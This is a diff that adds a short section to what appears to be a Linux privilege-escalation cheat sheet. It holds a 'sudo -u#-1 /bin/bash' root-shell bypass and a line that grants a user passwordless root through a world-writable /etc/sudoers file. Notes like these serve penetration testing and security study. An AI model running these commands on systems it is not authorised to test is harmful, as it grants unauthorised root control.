@@ -16,6 +16,14 @@ sudo -u#-1 /bin/bash
 ```
 
 
+Add user to sudoers group:
+- If the file /etc/sudoers is world writeable add your user to the sudo group with no password:
+```bash
+cbbn ALL=(ALL) NOPASSWD:ALL
+```
+
+
+
 ### LD_PRELOAD:
 While running sudo -l if we find:
 ```bash
